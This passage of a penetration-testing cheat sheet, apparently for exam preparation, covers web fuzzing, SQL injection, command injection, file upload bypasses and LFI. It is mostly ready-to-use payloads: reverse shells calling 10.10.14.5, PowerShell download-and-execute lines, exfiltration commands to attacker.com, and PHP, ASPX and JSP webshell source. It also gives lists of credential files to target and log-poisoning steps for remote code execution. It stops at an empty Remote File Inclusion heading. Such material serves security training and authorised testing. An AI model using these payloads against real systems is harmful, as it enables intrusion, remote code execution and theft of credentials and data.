ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -rate 100 -u http://<IP>/FUZZ -mc 200,429

# Massive file extension discovery (use with caution)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://<IP>/FUZZ -t 30 -c \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' \
  -mc 200,204,301,302,307,401,403,500 -ic \
  -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip

# POST request from file
ffuf -request request.txt -w /usr/share/wordlists/dirb/common.txt -request-proto http

# IDOR testing with sequential numbers
seq 1 1000 | ffuf -w - -u http://<IP>/user?id=FUZZ -mr "admin|root" -mc 200

# Multi-position fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt:FUZZ1 -w /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt:FUZZ2 -u http://<IP>/FUZZ1FUZZ2 -mc 200

# Output formats: json, ejson, html, md, csv, ecsv
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -o output.json -of json
```

#### WFuzz

```bash
# Basic directory fuzzing
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<IP>/FUZZ/ --hc 404,403

# With file extensions
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<IP>/FUZZ.php --hc 404,403

# Multiple extensions (FUZ2Z)
wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<IP>/FUZZ.FUZ2Z -z list,txt-php-html-js --hc 403,404 -c

# Hide responses by lines
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ --hl 20

# Hide responses by words
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ --hw 100

# Hide responses by characters
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ --hh 1234

# Show only specific status codes with output
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ --sc 200,301,302 -f output.txt

# POST data fuzzing
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/login.php -d "username=admin&password=FUZZ" --hc 401

# Header fuzzing (User-Agent)
wfuzz -w /usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H "User-Agent: FUZZ" -u http://<IP>/ --hc 404

# Cookie fuzzing
wfuzz -w /usr/share/wordlists/dirb/common.txt -b "session=FUZZ" -u http://<IP>/admin --hc 403

# Multiple fuzz points
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ/FUZ2Z -z list,txt-php --hc 403,404

# With threads
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -t 20 --hc 404

# Follow redirects
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ --follow --hc 404

# Proxy through Burp
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ -p 127.0.0.1:8080 --hc 404
```

### 2.3.2 üóÉÔ∏è SQL Injection (Manual Testing First)

> üìñ¬†**Reference**:¬†[SQL Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)

**üéØ Initial Probing Payloads:**

```sql
' 
" 
'-- 
"-- 
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
" OR "1"="1"--
' OR 1=1--
" OR 1=1--
admin'--
admin"--
admin' OR '1'='1
admin' OR 1=1--
admin") OR ("1"="1
1' AND 1=1--
1' AND 1=2--
1' OR '1'='1
OR 1=1--
' UNION SELECT NULL--
```

**üîç Observation Points:**

- Error messages revealing DB structure (MySQL, MSSQL, PostgreSQL)
- Content changes with true/false conditions
- Response time differences (Time-based SQLi)
- Different behavior between¬†`1=1`¬†(true) and¬†`1=2`¬†(false) conditions
- Blank pages or different content lengths
- Database-specific error messages

**üß™ Union-Based Testing (Column Discovery):**

```sql
# Discover number of columns
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL--
1' UNION SELECT NULL,NULL,NULL,NULL,NULL--

# Alternative: ORDER BY method
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
# Continue until error reveals column count

# Test which columns contain text
1' UNION SELECT 'a',NULL,NULL--
1' UNION SELECT NULL,'a',NULL--
1' UNION SELECT NULL,NULL,'a'--
```

**üìà Data Extraction (When Confirmed):**

**MySQL:**

```sql
# Version
' UNION SELECT NULL,@@version,NULL--
-1 UNION SELECT NULL,@@version,NULL--
' UNION SELECT @@version,NULL--

# Current database name
' UNION SELECT NULL,database(),NULL--
' UNION SELECT database()--

# Current user
' UNION SELECT NULL,user(),NULL--
' UNION SELECT NULL,current_user(),NULL--

# List all databases
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--

# List tables in current database
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database();#

# List columns in specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--
-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users';#

# Dump data from specific table
-1 UNION SELECT 1,2,group_concat(username,':',password) FROM users;#
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Read files (requires FILE privilege)
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
-1 UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--

# Write webshell (requires FILE privilege and write permissions)
' UNION SELECT NULL,"<?php system($_GET['cmd']);?>",NULL INTO OUTFILE "/var/www/html/shell.php"--
-1 UNION SELECT 1,"<?php system($_GET['cmd']);?>",3 INTO OUTFILE "/var/www/html/shell.php"--

# Bypass filters with comments
' UN/**/ION SE/**/LECT NULL,database()--
```

**MSSQL:**

```sql
# Authentication bypass
' OR 1=1--
admin'--
' OR '1'='1'--

# Version detection (time-based)
'; IF (SELECT @@version) LIKE '%2019%' WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--

# Get version
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT @@version,NULL--

# Current database
' UNION SELECT NULL,DB_NAME(),NULL--

# List databases
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT name FROM master..sysdatabases--

# List tables in current database
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

# List columns in specific table
' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

# Current user
' UNION SELECT NULL,SYSTEM_USER,NULL--
' UNION SELECT NULL,USER_NAME(),NULL--

# Enable xp_cmdshell (requires sysadmin)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# Execute commands via xp_cmdshell
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.5/shell.ps1'')"';--

# Read files
' UNION SELECT NULL,BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
```

**PostgreSQL:**

```sql
# Version
' UNION SELECT NULL,version(),NULL--

# Current database
' UNION SELECT NULL,current_database(),NULL--

# Current user
' UNION SELECT NULL,current_user,NULL--

# List databases
' UNION SELECT NULL,datname,NULL FROM pg_database--

# List tables in current database
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--

# List columns in specific table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Dump data
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--

# Command execution (requires superuser)
'; COPY (SELECT '') TO PROGRAM 'id';--
'; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;--

# Read files (requires superuser)
' UNION SELECT NULL,pg_read_file('/etc/passwd',0,1000000),NULL--
```

**SQLite:**

```sql
# List tables
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'--

# List columns (from CREATE statement)
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--

# Dump data
' UNION SELECT NULL,group_concat(username || ':' || password),NULL FROM users--

# SQLite version
' UNION SELECT NULL,sqlite_version(),NULL--
```

**Oracle:**

```sql
# Version
' UNION SELECT NULL,banner,NULL FROM v$version--

# Current user
' UNION SELECT NULL,user,NULL FROM dual--

# List tables
' UNION SELECT NULL,table_name,NULL FROM all_tables--

# List columns
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--

# Note: Oracle requires FROM clause, use "dual" dummy table
```

**üïê Time-Based Blind SQL Injection:**

```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END;--
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE pg_sleep(0) END;--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

**üî® Boolean-Based Blind SQL Injection:**

```sql
# Check if first character of database name is 'a'
' AND SUBSTRING(database(),1,1)='a'--

# ASCII comparison (bruteforce each character)
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))=109--

# Check table existence
' AND (SELECT COUNT(*) FROM users)>0--
' AND EXISTS(SELECT * FROM users)--

# Extract data character by character
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

**‚ö†Ô∏è Note About SQLMap:**

> SQLmap is¬†**often prohibited**¬†in pentesting exams. Always use manual techniques above for exam scenarios. SQLmap can be used in practice environments:

```bash
# Basic detection (PRACTICE ONLY - CHECK EXAM RULES)
sqlmap -u "http://<IP>/product.php?id=1" --batch

# Database enumeration
sqlmap -u "http://<IP>/product.php?id=1" --batch --dbs

# Tables in specific database
sqlmap -u "http://<IP>/product.php?id=1" -D webapp_db --tables

# Dump specific table
sqlmap -u "http://<IP>/product.php?id=1" -D webapp_db -T users --dump

# Dump all databases
sqlmap -u "http://<IP>/product.php?id=1" --dump-all --exclude-sysdbs

# POST request
sqlmap -u "http://<IP>/login.php" --data="username=admin&password=pass" --level=5 --risk=3

# With cookie authentication
sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=abc123" --batch

# From Burp request file
sqlmap -r request.txt --batch

# OS shell (if privileges allow)
sqlmap -u "http://<IP>/product.php?id=1" --os-shell

# Read file
sqlmap -u "http://<IP>/product.php?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://<IP>/product.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 2.3.3 ‚ö° Command Injection

> üìñ¬†**Reference**:¬†[Command Injection - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/)

**üéØ Test Payloads:**

```bash
# Semicolon separator
; id
; whoami
; ls
; pwd

# Pipe operator
| id
| whoami
| ls -la

# Logic operators
&& id
&& whoami
|| id
|| whoami
& id
& whoami

# Command substitution
`id`
$(id)
`whoami`
$(whoami)
`ls -la`
$(ls -la)

# Newline injection
%0aid
%0awhoami

# Full command injection examples
; cat /etc/passwd
| cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
&& cat /etc/passwd

# Reverse shell injection
; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
| bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# Python reverse shell
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Perl reverse shell
; perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows command injection
& whoami
| whoami
|| whoami
; whoami
%0awhoami
`whoami`
& dir
| ipconfig
& net user
```

**‚è±Ô∏è Blind Injection Detection (Time-Based):**

```bash
# Sleep commands (Linux)
; sleep 5
& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; sleep 10 &

# Ping based (works on both Windows/Linux)
; ping -c 10 127.0.0.1
& ping -c 10 127.0.0.1
| ping -n 10 127.0.0.1  # Windows

# Time calculation to verify
; date; sleep 5; date

# Timeout command (Windows)
& timeout /t 5
| timeout /t 5
```

**üîç Out-of-Band Detection (OOB):**

```bash
# DNS exfiltration (use Burp Collaborator or interactsh)
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
| host $(whoami).attacker.com

# HTTP callback
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/callback?data=$(id | base64)
| curl http://attacker.com/?data=$(hostname)

# SMB callback (Windows)
& certutil.exe -urlcache -split -f http://attacker.com/test
& net use \\attacker.com\share
```

**üõ°Ô∏è Bypass Techniques:**

```bash
# Space bypass
${IFS}
$IFS$9
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Command alternatives
# cat -> tac, nl, more, less, head, tail
tac /etc/passwd
nl /etc/passwd
more /etc/passwd

# Keyword filtering bypass
c''at /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
\c\a\t /etc/passwd

# Quote bypass
'w'h'o'a'm'i'
"w"h"o"a"m"i"
w''ho''am''i

# Wildcard bypass
/???/n? -? 127.0.0.1  # /bin/nc
/???/?s /  # /bin/ls
/???/?? /???/??ss??  # /bin/cat /etc/passwd

# Hex encoding
$(echo 636174202f6574632f706173737764 | xxd -r -p)  # cat /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash  # cat /etc/passwd

# Variable expansion
a=c;b=at;$a$b /etc/passwd
```

**ü™ü Windows-Specific Payloads:**

```cmd
# Basic commands
& whoami
| whoami
& hostname
& ipconfig
& net user
& net localgroup administrators

# List files
& dir
& dir C:\
& type C:\Windows\System32\drivers\etc\hosts

# PowerShell download and execute
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')"
& powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')"

# Certutil download
& certutil -urlcache -f http://10.10.14.5/nc.exe nc.exe
& nc.exe 10.10.14.5 4444 -e cmd.exe
```

### 2.3.4 üì§ File Upload Vulnerabilities

> üìñ¬†**Reference**:¬†[Upload Insecure Files - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Upload%20Insecure%20Files/)

**üéØ Test Sequence:**

1. Upload harmless file (`.txt`,¬†`.jpg`) - establish baseline
2. Test content-type bypass
3. Test extension bypass
4. Test magic number bypass
5. Test polyglot files
6. Test file content validation

**üîß Extension Bypass Techniques:**

```bash
# Double extension
shell.php.jpg
shell.php.png
shell.jpg.php
shell.png.php
shell.asp.jpg
shell.aspx.png

# Null byte (older systems, PHP < 5.3)
shell.php%00.jpg
shell.php\x00.jpg
shell.php%00.png
shell.asp%00.jpg

# Case manipulation
shell.PhP
shell.pHp
shell.PHP
shell.Php5
shell.AsP
shell.AsPx

# Trailing characters
shell.php.....
shell.php%20
shell.php%0a
shell.php%00
shell.php%0d%0a
shell.php/
shell.php.\

# Windows NTFS Alternate Data Stream
shell.php::$DATA
shell.asp::$DATA

# Alternative PHP extensions
shell.php3
shell.php4
shell.php5
shell.php7
shell.pht
shell.phtm
shell.phtml
shell.phps
shell.phar
shell.pgif
shell.shtml
shell.inc

# ASP/ASPX alternatives
shell.asp
shell.aspx
shell.cer
shell.asa
shell.asax
shell.ascx
shell.ashx
shell.asmx
shell.axd
shell.config
shell.compiled

# JSP alternatives
shell.jsp
shell.jspx
shell.jsw
shell.jsv
shell.jspf
shell.wss

# Other executable extensions
shell.pl
shell.py
shell.rb
shell.cgi
```

**üé® Content-Type Bypass:**

```bash
# Capture upload request in Burp Suite and modify Content-Type:

# Original (blocked)
Content-Type: application/x-php

# Bypass attempts
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: text/plain
Content-Type: application/octet-stream
```

**üìù Magic Number/Signature Bypass (Polyglot Files):**

```bash
# Add magic bytes to beginning of PHP file

# GIF header + PHP
GIF89a;
<?php system($_GET['cmd']); ?>

# GIF header (hexadecimal)
GIF89a<?php system($_GET['cmd']); ?>

# PNG header + PHP
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x03H\x00\x00\x01\xF4\x08\x06
<?php system($_GET['cmd']); ?>

# JPEG header + PHP
\xff\xd8\xff\xe0
<?php system($_GET['cmd']); ?>

# PDF header + PHP
%PDF-1.5
<?php system($_GET['cmd']); ?>
```

**üß© Creating Polyglot Files:**

```bash
# Method 1: Using exiftool (inject PHP into image metadata)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg

# Method 2: Manual GIF polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# Method 3: Prepend magic bytes to PHP shell
printf '\xff\xd8\xff\xe0' > shell.php
cat phpshell.php >> shell.php

# View metadata
exiftool shell.php.jpg
file shell.php.jpg
```

**üîç File Size Bypass:**

```bash
# Some filters check file size
# Try minimum valid file (1 byte)
# Try exact maximum allowed size
# Try just under maximum (max - 1 byte)
```

**üåê Common Upload Locations to Test:**

```
/uploads/
/upload/
/files/
/file/
/images/
/image/
/media/
/assets/
/static/
/content/
/tmp/
/temp/
/user_uploads/
/profile_images/
/attachments/
/documents/
/downloads/
```

**üß™ PHP Shell Examples:**

```php
# Simple PHP shell
<?php system($_GET['cmd']); ?>

# One-liner shell
<?php echo shell_exec($_GET['cmd']); ?>

# Ultra-minimal shell
<?=`$_GET[0]`?>

# Short tags
<? system($_GET['cmd']); ?>

# Alternative functions
<?php passthru($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?=$_GET[0]($_GET[1]);?>

# More robust shell with output
<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

# Obfuscated shell
<?php $a=$_GET['a'];$b=$_GET['b'];$a($b); ?>
# Usage: shell.php?a=system&b=whoami

# Using assert (older PHP)
<?php assert($_GET['cmd']); ?>

# Using preg_replace (PHP < 5.5)
<?php preg_replace('/.*/e', $_GET['cmd'], ''); ?>

# File upload + execution
<?php
if($_FILES){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
?>
```

**ü™ü ASP/ASPX Shell Examples:**

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Response.Write("<pre>");
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
    Response.Write("</pre>");
}
</script>
```

**‚òï JSP Shell Example:**

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int a;
    while((a = in.read()) != -1) {
        out.print((char)a);
    }
%>
```

### 2.3.5 üìÅ Path Traversal & LFI/RFI

> üìñ¬†**References**:
> 
> - [File Inclusion - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
> - [Directory Traversal - PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Directory%20Traversal/)

**üîç Basic Traversal Tests:**

```text
# Standard traversal (Linux)
../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd

# Windows traversal
..\..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini

# URL encoded (single encoding)
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2Fwindows%2Fwin.ini

# URL encoded (double encoding)
..%252F..%252F..%252Fetc%252Fpasswd

# Different encoding types
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%e0%80%af..%e0%80%afetc%e0%80%afpasswd

# Path bypass with dots
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd

# Unicode/UTF-8 encoding
..%c1%1c..%c1%1c..%c1%1cetc%c1%1cpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Null byte (older PHP < 5.3)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../../etc/passwd\x00

# Absolute paths
/etc/passwd
/etc/shadow
/var/www/html/index.php
C:\Windows\System32\drivers\etc\hosts
C:\boot.ini
C:\inetpub\wwwroot\web.config

# Mixed slashes
..\/..\/..\/etc/passwd
....\/\/....\/\/etc/passwd
```

**üß© PHP Wrappers (LFI to RCE):**

```text
# php://filter - Base64 encode source code
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../config.php
php://filter/convert.base64-encode/resource=/var/www/html/admin.php

# Read and decode:
echo "BASE64_OUTPUT" | base64 -d

# Different encodings
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-7/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# php://input - Execute PHP code via POST data
php://input
# POST data: <?php system('id'); ?>
# POST data: <?php system($_GET['cmd']); ?>

# Usage with curl
curl -X POST "http://<IP>/index.php?page=php://input" -d "<?php system('id'); ?>"
curl -X POST "http://<IP>/index.php?page=php://input" -d "<?php system(\$_GET['cmd']); ?>" -G --data-urlencode "cmd=whoami"

# data:// wrapper - Execute PHP code inline
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Base64 encode payload
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Result: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Usage
http://<IP>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id

# expect:// wrapper (if expect extension installed - rare)
expect://id
expect://ls
expect://whoami

# Usage
http://<IP>/index.php?page=expect://id

# zip:// wrapper
zip://archive.zip#shell.php
zip:///path/to/archive.zip#shell.php

# phar:// wrapper
phar://shell.phar/shell.php
phar:///path/to/shell.phar/shell.php

# Create phar archive
# 1. Create shell.php
# 2. Create phar: php -r '$phar = new Phar("shell.phar"); $phar->addFile("shell.php"); $phar->stopBuffering();'
# 3. Upload shell.phar
# 4. Access: ?page=phar://shell.phar/shell.php
```

**üîó PHP Filter Chain Generator (LFI to RCE without File Upload):**

> üìñ¬†**Tool**:¬†[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)

```bash
# Install
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# Generate filter chain for command execution
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'

# Output will be a long php://filter chain

# Use generated chain
curl "http://<IP>/index.php?page=php://filter/convert.iconv...<GENERATED_CHAIN>...php://temp&0=id"

# Generate reverse shell chain
python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"'); ?>"

# Save to file for easy use
python3 php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>' | grep "^php" > payload.txt

# Execute with curl
curl "http://<IP>/index.php?file=$(cat payload.txt)&0=whoami"
```

**üîç Common Files to Target (Linux):**

```
# Password files
/etc/passwd
/etc/shadow
/etc/group
/etc/security/passwd
/etc/security/group

# System info
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/etc/lsb-release
/proc/version
/proc/cmdline
/proc/self/environ
/proc/self/stat
/proc/self/status

# Web server configs
/etc/apache2/apache2.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf
/usr/local/apache2/conf/httpd.conf
/usr/local/etc/apache22/httpd.conf

# Database configs
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/var/lib/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH configs and keys
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/root/.ssh/id_rsa
/root/.ssh/id_dsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/id_dsa
/home/user/.ssh/authorized_keys
/home/user/.ssh/known_hosts

# Shell history
/root/.bash_history
/root/.zsh_history
/home/user/.bash_history
/home/user/.zsh_history

# Logs (for log poisoning)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/messages
/var/log/secure
/var/log/mail.log
/var/log/vsftpd.log
/var/log/httpd/access_log
/var/log/httpd/error_log

# Mail
/var/mail/root
/var/mail/www-data
/var/spool/mail/root
/var/spool/mail/www-data

# Cron
/etc/crontab
/etc/cron.d/*
/var/spool/cron/crontabs/root

# Application files
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
```

**üîç Common Files to Target (Windows):**

```
# System files
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini

# IIS configs
C:\inetpub\wwwroot\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
C:\inetpub\logs\LogFiles\W3SVC1\

# Apache/XAMPP (Windows)
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\mysql\bin\my.ini
C:\xampp\phpMyAdmin\config.inc.php

# Installation/Setup logs
C:\Windows\debug\NetSetup.log
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml

# User files
C:\Users\Administrator\Desktop\
C:\Users\Administrator\Documents\
C:\Users\Administrator\AppData\Roaming\
C:\Users\Public\Desktop\
```

**üéØ Web Application Specific Files:**

```
# PHP configs
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/configuration.php
/var/www/html/settings.php
/var/www/html/db_config.php
/var/www/html/database.php

# WordPress
../../../../wp-config.php
/var/www/html/wp-config.php
/var/www/html/wp-content/plugins/
/var/www/html/wp-includes/version.php
/var/www/html/wp-admin/

# Drupal
/var/www/html/sites/default/settings.php

# Joomla
/var/www/html/configuration.php

# Session files (for Session hijacking)
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
```

**üíâ Log Poisoning (LFI to RCE):**

```bash
# Apache access.log poisoning via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
curl -A "<?php system(\$_GET['c']); ?>" http://<IP>/test.php

# Then include the log file
curl "http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=id"
curl "http://<IP>/index.php?page=../../../var/log/apache2/access.log&c=whoami"

# Nginx log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP>/
curl "http://<IP>/index.php?page=/var/log/nginx/access.log&cmd=id"

# Poison via Referer header
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://<IP>/

# SSH log poisoning (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@<IP>
# Then include /var/log/auth.log

# Mail log poisoning
telnet <IP> 25
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: root
DATA
test
.
QUIT

# Then include /var/mail/www-data or /var/log/mail.log
curl "http://<IP>/index.php?page=/var/log/mail.log&cmd=id"

# FTP log poisoning
ftp <IP>
USER <?php system($_GET['cmd']); ?>
# Then include /var/log/vsftpd.log
```

**üîó Remote File Inclusion (RFI):**

```text
